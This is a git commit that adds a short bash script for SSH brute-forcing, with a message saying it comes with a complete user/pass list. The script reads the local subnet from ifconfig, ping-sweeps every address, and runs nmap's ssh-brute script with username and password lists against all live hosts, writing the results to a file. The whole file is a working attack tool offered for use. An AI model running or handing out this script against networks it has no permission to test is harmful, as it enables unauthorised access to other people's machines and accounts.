8622b045380a99da505496abef219eb0a1f77677
stevenservo <saspring1144@gmail.com>
2022-04-10 15:31:32 -0700

    added a bruteforce script along with complete user/pass list

---
+++ bruteforce/nmapbruteforce.sh
@@ -0,0 +1,14 @@
+#!/usr/bin/bash
+ifconfig | grep "broadcast" | cut -d " " -f 10 | cut -d "." -f 1,2,3 | uniq > octets.txt
+echo "looking for active devices on the network"
+cat octets.txt | while read line || [[ -n $line ]];
+do
+	for ip in {1..254}
+	do
+	ping -c 1 $line.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" >> octets.txt &
+	done
+done
+sudo nmap --script ssh-brute -p22 -iL octets.txt --script-args userdb=usernames.txt,passdb=passlist.txt | tee results.txt
+rm octets.txt
+exit
+
